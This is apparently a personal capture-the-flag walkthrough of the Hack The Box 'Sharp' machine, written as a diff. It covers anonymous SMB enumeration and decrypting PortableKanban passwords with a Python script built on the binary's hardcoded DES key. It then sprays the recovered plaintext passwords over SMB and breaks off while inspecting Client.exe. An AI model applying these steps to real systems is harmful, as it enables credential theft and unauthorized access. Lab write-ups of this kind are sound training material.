@@ -1,0 +1,1263 @@
+Sharp - Hack The Box - Hard Windows - C#, Analyzing .net binaries, Decompiling, .net application for remoting, serialized payloads.
+
+Should be done on windows, convert linux to router have both linux and windows connected.
+
+4 ports open: 135,139, 445, 8888
+
+No webserver
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec smb 10.10.10.219
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+=====================================================================================================================================
+
+We try enumerating with crackmap but fail, we then try smbmap and get a list of shares.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp/nmap]
+└──╼ $smbmap -H 10.10.10.219 
+[+] IP: 10.10.10.219:445	Name: 10.10.10.219                                      
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	dev                                               	NO ACCESS	
+	IPC$                                              	NO ACCESS	Remote IPC
+	kanban                                            	READ ONLY
+=====================================================================================================================================
+
+
+Installing crackmap in container directory
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/opt]
+└──╼ $sudo git clone https://github.com/byt3bl33d3r/CrackMapExec.git
+Cloning into 'CrackMapExec'...
+remote: Enumerating objects: 3651, done.
+remote: Counting objects: 100% (19/19), done.
+remote: Compressing objects: 100% (19/19), done.
+remote: Total 3651 (delta 8), reused 0 (delta 0), pack-reused 3632
+Receiving objects: 100% (3651/3651), 6.03 MiB | 6.97 MiB/s, done.
+Resolving deltas: 100% (2502/2502), done.
+┌─[user@parrot-virtual]─[/opt]
+└──╼ $cd CrackMapExec/
+┌─[user@parrot-virtual]─[/opt/CrackMapExec]
+└──╼ $poetry install
+Installing dependencies from lock file
+=====================================================================================================================================
+
+We tried enumerating with spider plus to save readable output to file on cme bu this fails
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec smb 10.10.10.219 -u '' -p '' -M spider_plus
+[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [-] Sharp\: STATUS_ACCESS_DENIED 
+SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: ['print$']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200
+SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
+Traceback (most recent call last):
+  File "/usr/lib/python3/dist-packages/cme/protocols/smb.py", line 567, in shares
+    self.db.add_share(computer_id, user_id, share_name, share_remark, read, write)
+UnboundLocalError: local variable 'user_id' referenced before assignment
+
+During handling of the above exception, another exception occurred:
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/nmap]
+└──╼ $smbclient -L //10.10.10.219/kanpan -N
+Anonymous login successful
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	dev             Disk      
+	IPC$            IPC       Remote IPC
+	kanban          Disk      
+SMB1 disabled -- no workgroup available
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $smbclient //10.10.10.219/kanban -N
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \>
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> mget *
+getting file \CommandLine.dll of size 58368 as CommandLine.dll (106.3 KiloBytes/sec) (average 106.3 KiloBytes/sec)
+getting file \CsvHelper.dll of size 141312 as CsvHelper.dll (304.6 KiloBytes/sec) (average 197.2 KiloBytes/sec)
+getting file \DotNetZip.dll of size 456704 as DotNetZip.dll (978.1 KiloBytes/sec) (average 443.6 KiloBytes/sec)
+getting file \Itenso.Rtf.Converter.Html.dll of size 23040 as Itenso.Rtf.Converter.Html.dll (64.8 KiloBytes/sec) (average 370.3 KiloBytes/sec)
+getting file \Itenso.Rtf.Interpreter.dll of size 75776 as Itenso.Rtf.Interpreter.dll (211.4 KiloBytes/sec) (average 344.3 KiloBytes/sec)
+getting file \Itenso.Rtf.Parser.dll of size 32768 as Itenso.Rtf.Parser.dll (92.8 KiloBytes/sec) (average 309.4 KiloBytes/sec)
+getting file \Itenso.Sys.dll of size 19968 as Itenso.Sys.dll (57.4 KiloBytes/sec) (average 279.1 KiloBytes/sec)
+getting file \MsgReader.dll of size 376832 as MsgReader.dll (934.0 KiloBytes/sec) (average 359.2 KiloBytes/sec)
+getting file \Ookii.Dialogs.dll of size 133296 as Ookii.Dialogs.dll (364.6 KiloBytes/sec) (average 359.7 KiloBytes/sec)
+getting file \pkb.zip of size 2558011 as pkb.zip (3389.5 KiloBytes/sec) (average 877.2 KiloBytes/sec)
+getting file \PortableKanban.cfg of size 5819 as PortableKanban.cfg (16.7 KiloBytes/sec) (average 814.4 KiloBytes/sec)
+getting file \PortableKanban.Data.dll of size 118184 as PortableKanban.Data.dll (329.8 KiloBytes/sec) (average 780.5 KiloBytes/sec)
+getting file \PortableKanban.exe of size 1878440 as PortableKanban.exe (2766.8 KiloBytes/sec) (average 1012.8 KiloBytes/sec)
+getting file \PortableKanban.Extensions.dll of size 31144 as PortableKanban.Extensions.dll (83.6 KiloBytes/sec) (average 956.8 KiloBytes/sec)
+getting file \PortableKanban.pk3 of size 2080 as PortableKanban.pk3 (5.9 KiloBytes/sec) (average 905.2 KiloBytes/sec)
+getting file \PortableKanban.pk3.bak of size 2080 as PortableKanban.pk3.bak (5.9 KiloBytes/sec) (average 859.0 KiloBytes/sec)
+getting file \PortableKanban.pk3.md5 of size 34 as PortableKanban.pk3.md5 (0.1 KiloBytes/sec) (average 818.0 KiloBytes/sec)
+getting file \ServiceStack.Common.dll of size 413184 as ServiceStack.Common.dll (1042.6 KiloBytes/sec) (average 829.7 KiloBytes/sec)
+getting file \ServiceStack.Interfaces.dll of size 137216 as ServiceStack.Interfaces.dll (363.1 KiloBytes/sec) (average 807.7 KiloBytes/sec)
+getting file \ServiceStack.Redis.dll of size 292352 as ServiceStack.Redis.dll (777.9 KiloBytes/sec) (average 806.3 KiloBytes/sec)
+getting file \ServiceStack.Text.dll of size 411648 as ServiceStack.Text.dll (388.0 KiloBytes/sec) (average 759.3 KiloBytes/sec)
+getting file \User Guide.pdf of size 1050092 as User Guide.pdf (947.8 KiloBytes/sec) (average 779.1 KiloBytes/sec)
+getting file \Plugins\PluginsLibrary.dll of size 64424 as Plugins/PluginsLibrary.dll (182.4 KiloBytes/sec) (average 759.8 KiloBytes/sec)
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+smb: \> ls
+  .                                   D        0  Sat Nov 14 10:56:03 2020
+  ..                                  D        0  Sat Nov 14 10:56:03 2020
+  CommandLine.dll                     A    58368  Wed Feb 27 00:06:14 2013
+  CsvHelper.dll                       A   141312  Wed Nov  8 05:52:18 2017
+  DotNetZip.dll                       A   456704  Wed Jun 22 13:31:52 2016
+  Files                               D        0  Sat Nov 14 10:57:59 2020
+  Itenso.Rtf.Converter.Html.dll       A    23040  Thu Nov 23 08:29:32 2017
+  Itenso.Rtf.Interpreter.dll          A    75776  Thu Nov 23 08:29:32 2017
+  Itenso.Rtf.Parser.dll               A    32768  Thu Nov 23 08:29:32 2017
+  Itenso.Sys.dll                      A    19968  Thu Nov 23 08:29:32 2017
+  MsgReader.dll                       A   376832  Thu Nov 23 08:29:32 2017
+  Ookii.Dialogs.dll                   A   133296  Thu Jul  3 14:20:12 2014
+  pkb.zip                             A  2558011  Thu Nov 12 12:04:59 2020
+  Plugins                             D        0  Thu Nov 12 12:05:11 2020
+  PortableKanban.cfg                  A     5819  Sat Nov 14 10:56:01 2020
+  PortableKanban.Data.dll             A   118184  Thu Jan  4 13:12:46 2018
+  PortableKanban.exe                  A  1878440  Thu Jan  4 13:12:44 2018
+  PortableKanban.Extensions.dll       A    31144  Thu Jan  4 13:12:50 2018
+  PortableKanban.pk3                  A     2080  Sat Nov 14 10:56:01 2020
+  PortableKanban.pk3.bak              A     2080  Sat Nov 14 10:55:54 2020
+  PortableKanban.pk3.md5              A       34  Sat Nov 14 10:56:03 2020
+  ServiceStack.Common.dll             A   413184  Wed Sep  6 04:18:22 2017
+  ServiceStack.Interfaces.dll         A   137216  Wed Sep  6 04:17:30 2017
+  ServiceStack.Redis.dll              A   292352  Wed Sep  6 04:02:24 2017
+  ServiceStack.Text.dll               A   411648  Tue Sep  5 20:38:18 2017
+  User Guide.pdf                      A  1050092  Thu Jan  4 13:14:28 2018
+
+\Files
+  .                                   D        0  Sat Nov 14 10:57:59 2020
+  ..                                  D        0  Sat Nov 14 10:57:59 2020
+
+\Plugins
+  .                                   D        0  Thu Nov 12 12:05:11 2020
+  ..                                  D        0  Thu Nov 12 12:05:11 2020
+  PluginsLibrary.dll                  A    64424  Thu Jan  4 13:12:52 2018
+=====================================================================================================================================
+
+We find portable kanaban and we google to find out what it is.
+Apparently there is an exploit available in exploitdb
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $searchsploit kanban
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+PortableKanban 4.3.6578.38136 - Encrypted Password Retrieval                                            | windows/local/49409.py
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+=====================================================================================================================================
+
+Looks like a plugin for atlassian.
+
+Issues are happening with crackmap while using null authentication, will have to test later with normal user.
+Commands and Output:
+=====================================================================================================================================
+poetry run crackmapexec smb 10.10.10.219 -u ''  -p '' --get-file \\kanban\pkb.zip pkb.zip
+=====================================================================================================================================
+
+
+Luckily for us we already downloaded all the files with smbclient.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $mkdir pkb 
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $mv pkb.zip pkb
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $cd !$
+cd pkb
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban/pkb]
+└──╼ $ls
+pkb.zip
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban/pkb]
+└──╼ $unzip pkb.zip 
+Archive:  pkb.zip
+  inflating: CommandLine.dll         
+  inflating: CsvHelper.dll           
+  inflating: DotNetZip.dll           
+  inflating: Itenso.Rtf.Converter.Html.dll  
+  inflating: Itenso.Rtf.Interpreter.dll  
+  inflating: Itenso.Rtf.Parser.dll   
+  inflating: Itenso.Sys.dll          
+  inflating: MsgReader.dll           
+  inflating: Ookii.Dialogs.dll       
+   creating: Plugins/
+  inflating: Plugins/PluginsLibrary.dll  
+  inflating: PortableKanban.Data.dll  
+  inflating: PortableKanban.exe      
+  inflating: PortableKanban.Extensions.dll  
+  inflating: ServiceStack.Common.dll  
+  inflating: ServiceStack.Interfaces.dll  
+  inflating: ServiceStack.Redis.dll  
+  inflating: ServiceStack.Text.dll   
+  inflating: User Guide.pdf          
+=====================================================================================================================================
+
+After pytting the pkb files in a separate directory we find a bunch of dlls.
+Next we will need to work from windows so we will smbserver to create a smb share to transfer files over to our windows commando box.
+
+
+When we run the PortableKanban.exe file in the pkb directory it creates alocal file, if we look ath the kanban directory there are a lot
+of iles that where not created in the pkb directory. Namely a kanban pk3 file. We will copy the backup file to our pkb folder.
+
+We open the .bak file with sublime and we get a jquery file. If we examine the md5 sums of the files within the kanban directory we 
+notice they have the same md5hash sum.
+Commands and Output:
+=====================================================================================================================================
+ Itenso.Rtf.Interpreter.dll      PortableKanban.cfg      PortableKanban.pk3.md5
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/kanban]
+└──╼ $md5sum PortableKanban.pk3*
+0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3
+0e3d7c07174011699fa4e1d29f02662b  PortableKanban.pk3.bak
+02c445fdc6a8b05ea23cd821534442e5  PortableKanban.pk3.md5
+=====================================================================================================================================
+
+We find an ecnrypted string for administrator, however it seems to be not so sophisticated as the entropy for the string is very low
+Commands and Output:
+=====================================================================================================================================
+  "Users": [
+    {
+      "Id": "e8e29158d70d44b1a1ba4949d52790a0",
+      "Name": "Administrator",
+      "Initials": "",
+      "Email": "",
+      "EncryptedPassword": "k+iUoOvQYG98PuhhRC7/rg==",
+      "Role": "Admin",
+      "Inactive": false,
+      "TimeStamp": 637409769245503700
+    },
+..
+..
+..
+└──╼ $echo -n "k+iUoOvQYG98PuhhRC7/rg==" | base64 -d | ent
+Entropy = 3.875000 bits per byte.
+
+Optimum compression would reduce the size
+of this 16 byte file by 51 percent.
+
+Chi square distribution for 16 samples is 272.00, and randomly
+would exceed this value 22.18 percent of the times.
+
+Arithmetic mean value of data bytes is 149.6875 (127.5 = random).
+Monte Carlo value for Pi is 4.000000000 (error 27.32 percent).
+Serial correlation coefficient is 0.006735 (totally uncorrelated = 0.0).
+=====================================================================================================================================
+
+If the string were above ti would most likely be real encryption. We also get another username of the jquery: "lars"
+Commands and Output:
+=====================================================================================================================================
+    {
+      "Id": "0628ae1de5234b81ae65c246dd2b4a21",
+      "Name": "lars",
+      "Initials": "",
+      "Email": "",
+      "EncryptedPassword": "Ua3LyPFM175GN8D3+tqwLA==",
+      "Role": "User",
+      "Inactive": false,
+      "TimeStamp": 637409769265925600
+    }
+=====================================================================================================================================
+
+What if we created a new user?
+We copy the bracket containing the admin user and password from the jquery string, and append it after the lars user and blank out the
+password and modify the ID parameter to something different.
+Commands and Output:
+=====================================================================================================================================
+{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731}
+=====================================================================================================================================
+
+Commands and Output:
+=====================================================================================================================================
+[{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"k+iUoOvQYG98PuhhRC7/rg==","Role":"Admin","Inactive":false,"TimeStamp":637409769245503731},{"Id":"0628ae1de5234b81ae65c246dd2b4a21","Name":"lars","Initials":"","Email":"","EncryptedPassword":"Ua3LyPFM175GN8D3+tqwLA==","Role":"User","Inactive":false,"TimeStamp":637409769265925613},{"Id":"0628ae1de5234b81ae65c246dd2b4a56","Name":"hacker","Initials":"","Email":"","EncryptedPassword":"","Role":"Admin","Inactive":false,"TimeStamp":637409769265925613}]
+=====================================================================================================================================
+
+We the delete and replace the old bak from kanban with the modified bak file from the pkb directory and also delete the pk3 file in 
+kanban and we execute the exe file and we get a message saying that the bak file has been used since the original was deleted by us.
+
+When we run the executable we get a demo folder with a task, interestingly if we go the to settings icon and click on "Users" we can 
+unhide the passwords set by the users and retrieve their plaintext.
+Commands and Output:
+=====================================================================================================================================
+|Administrator |G2@$btRSHJYTarg|
+|lars | G123HHrth234gRG|
+|hacker|<BLANK>|
+=====================================================================================================================================
+
+If we did not have the capavility of unhiding the passwords with the application we could use something like dnspy to see the encryption
+process and step through it by decompiling.
+
+We open dnspy and open the kanban executable as well as the data dll and find out how it works.
+C:\Users\commando\Desktop\kanban\PortableKanban.exe
+C:\Users\commando\Desktop\kanban\PortableKanban.Data.dll
+
+We poke around and find kanban's crypto module. Within the module we find to secrets at the end of the decrypt function inside the 
+crypto function both an IV and Key we can replicate.
+
+Commands and Output:
+=====================================================================================================================================
+		// Token: 0x04000001 RID: 1
+		private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ");
+
+		// Token: 0x04000002 RID: 2
+		private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");
+	}
+}
+=====================================================================================================================================
+
+We create a little script in python using the des library to decrypt the text
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $cat dec.py 
+import sys
+from base64 import b64decode
+import des
+#private static byte[] _rgbKey = Encoding.ASCII.GetBytes("7ly6UznJ");
+#private static byte[] _rgbIV = Encoding.ASCII.GetBytes("XuVUm5fR");
+
+passwd = b64decode(sys.argv[1])
+
+c = des.DesKey(b'7ly6UznJ')
+iv = b'XuVUm5fR'
+print(c.decrypt(passwd, initial=iv, padding=True))
+
+..
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $python dec.py "k+iUoOvQYG98PuhhRC7/rg=="
+b'G2@$btRSHJYTarg'
+
+..
+..
+..
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $python dec.py "Ua3LyPFM175GN8D3+tqwLA=="
+b'G123HHrth234gRG'
+=====================================================================================================================================
+
+We get both plain text passwords as well. Next thing to do is do a password spray with those password using crackmap.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec smb 10.10.10.219 -u users.lst -p passwords.lst 
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    445    SHARP            [-] Sharp\administrator:G123HHrth234gRG STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    445    SHARP            [-] Sharp\lars:G2@$btRSHJYTarg STATUS_LOGON_FAILURE 
+SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
+=====================================================================================================================================
+
+We get a hit with "Sharp\lars:G123HHrth234gRG"
+We can try to see if we can windows remote however that fails since there is now windows remote management port listening.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec winrm 10.10.10.219 -u users.lst -p passwords.lst 
+WINRM       10.10.10.219    5985   SHARP            [*] Windows 10.0 Build 17763 (name:SHARP) (domain:Sharp)
+WINRM       10.10.10.219    5985   SHARP            [*] http://10.10.10.219:5985/wsman
+WINRM       10.10.10.219    5985   SHARP            [-] Sharp\administrator:G2@$btRSHJYTarg
+WINRM       10.10.10.219    5985   SHARP            [-] Sharp\administrator:G123HHrth234gRG
+WINRM       10.10.10.219    5985   SHARP            [-] Sharp\lars:G2@$btRSHJYTarg
+WINRM       10.10.10.219    5985   SHARP            [-] Sharp\lars:G123HHrth234gRG
+=====================================================================================================================================
+
+Next we can try and enumerate more using the lars user.
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec smb 10.10.10.219 -u lars -p 'G123HHrth234gRG' --shares
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
+SMB         10.10.10.219    445    SHARP            [+] Enumerated shares
+SMB         10.10.10.219    445    SHARP            Share           Permissions     Remark
+SMB         10.10.10.219    445    SHARP            -----           -----------     ------
+SMB         10.10.10.219    445    SHARP            ADMIN$                          Remote Admin
+SMB         10.10.10.219    445    SHARP            C$                              Default share
+SMB         10.10.10.219    445    SHARP            dev             READ            
+SMB         10.10.10.219    445    SHARP            IPC$            READ            Remote IPC
+SMB         10.10.10.219    445    SHARP            kanban
+=====================================================================================================================================
+
+We now have read access to "dev" on the windows machine.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp]
+└──╼ $crackmapexec smb 10.10.10.219 -u lars -p 'G123HHrth234gRG' -M spider_plus
+[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
+SMB         10.10.10.219    445    SHARP            [*] Windows 10.0 Build 17763 x64 (name:SHARP) (domain:Sharp) (signing:False) (SMBv1:False)
+SMB         10.10.10.219    445    SHARP            [+] Sharp\lars:G123HHrth234gRG 
+SPIDER_P... 10.10.10.219    445    SHARP            [*] Started spidering plus with option:
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        DIR: ['print$']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.10.10.219    445    SHARP            [*]       SIZE: 51200
+SPIDER_P... 10.10.10.219    445    SHARP            [*]     OUTPUT: /tmp/cme_spider_plus
+
+..
+..
+..
+}┌─[user@parrot-virtual]─[/tmp/cme_spider_plus]
+└──╼ $cat 10.10.10.219.json  | jq
+{
+  "IPC$": {
+    "InitShutdown": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "LSM_API_service": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "W32TIME_ALT": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-158-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-1e4-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-268-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-270-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-368-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "Winsock2\\CatalogChangeListener-444-0": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "atsvc": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "epmapper": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "eventlog": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "lsass": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "4 Bytes"
+    },
+    "ntsvcs": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "scerpc": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "3 Bytes"
+    },
+    "srvsvc": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "4 Bytes"
+    },
+    "vgauth-service": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "1 Bytes"
+    },
+    "wkssvc": {
+      "atime_epoch": "1600-12-31 16:07:02",
+      "ctime_epoch": "1600-12-31 16:07:02",
+      "mtime_epoch": "1600-12-31 16:07:02",
+      "size": "4 Bytes"
+    }
+  },
+  "dev": {
+    "Client.exe": {
+      "atime_epoch": "2020-11-15 03:29:48",
+      "ctime_epoch": "2020-11-15 03:29:48",
+      "mtime_epoch": "2020-11-15 02:25:01",
+      "size": "5.5 KB"
+    },
+    "RemotingLibrary.dll": {
+      "atime_epoch": "2020-11-15 03:30:00",
+      "ctime_epoch": "2020-11-15 03:30:00",
+      "mtime_epoch": "2020-11-15 02:25:01",
+      "size": "4 KB"
+    },
+    "Server.exe": {
+      "atime_epoch": "2020-11-16 03:56:10",
+      "ctime_epoch": "2020-11-15 03:30:13",
+      "mtime_epoch": "2020-11-16 03:55:44",
+      "size": "6 KB"
+    },
+    "notes.txt": {
+      "atime_epoch": "2020-11-15 05:59:02",
+      "ctime_epoch": "2020-11-15 02:14:12",
+      "mtime_epoch": "2020-11-15 05:59:02",
+      "size": "70 Bytes"
+    }
+  }
+}
+=====================================================================================================================================
+
+And we get many more dll's and executables. We can sift through these and just focus on the files found in dev.
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[/tmp/cme_spider_plus]
+└──╼ $cat 10.10.10.219.json  | jq | grep -v "size\|time\|\}" | awk -F "\"" '{print $2}'
+
+IPC$
+InitShutdown
+LSM_API_service
+PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER
+W32TIME_ALT
+Winsock2\\CatalogChangeListener-158-0
+Winsock2\\CatalogChangeListener-1e4-0
+Winsock2\\CatalogChangeListener-268-0
+Winsock2\\CatalogChangeListener-270-0
+Winsock2\\CatalogChangeListener-368-0
+Winsock2\\CatalogChangeListener-444-0
+atsvc
+epmapper
+eventlog
+lsass
+ntsvcs
+scerpc
+srvsvc
+vgauth-service
+wkssvc
+dev
+Client.exe
+RemotingLibrary.dll
+Server.exe
+notes.txt
+=====================================================================================================================================
+
+We can now use smb client and retrieve all the files in the dev share.
+
+Commands and Output:
+=====================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $smbclient -U lars //10.10.10.219/dev
+Enter WORKGROUP\lars's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sun Nov 15 03:30:13 2020
+  ..                                  D        0  Sun Nov 15 03:30:13 2020
+  Client.exe                          A     5632  Sun Nov 15 02:25:01 2020
+  notes.txt                           A       70  Sun Nov 15 05:59:02 2020
+  RemotingLibrary.dll                 A     4096  Sun Nov 15 02:25:01 2020
+  Server.exe                          A     6144  Mon Nov 16 03:55:44 2020
+
+		10357247 blocks of size 4096. 7421969 blocks available
+smb: \> recurse ON
+smb: \> prompt off
+smb: \> mget *
+getting file \Client.exe of size 5632 as Client.exe (14.0 KiloBytes/sec) (average 14.0 KiloBytes/sec)
+getting file \notes.txt of size 70 as notes.txt (0.2 KiloBytes/sec) (average 7.3 KiloBytes/sec)
+getting file \RemotingLibrary.dll of size 4096 as RemotingLibrary.dll (11.5 KiloBytes/sec) (average 8.6 KiloBytes/sec)
+getting file \Server.exe of size 6144 as Server.exe (17.2 KiloBytes/sec) (average 10.7 KiloBytes/sec)
+
+=====================================================================================================================================
+
+We can try and analyze the files and we look at notes and the executable client.exe
+Commands and Output:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $ls
+Client.exe  notes.txt  RemotingLibrary.dll  Server.exe
+┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $cat notes.txt 
+Todo:
+    Migrate from .Net remoting to WCF
+    Add input validation┌─[user@parrot-virtual]─[~/htb/sharp/smb/dev]
+└──╼ $strings Client.exe 
+!This program cannot be run in DOS mode.
+.text
+`.rsrc
+@.reloc
+BSJB
+v4.0.30319
+#Strings
+#GUID
+#Blob
+<Module>
+mscorlib
+RuntimeTypeHandle
+GetTypeFromHandle
+RemotingSample
+Type
+GuidAttribute
+DebuggableAttribute
+ComVisibleAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyFileVersionAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+Client.exe
+System.Runtime.Versioning
+System.Runtime.Remoting
+IChannel
+TcpChannel
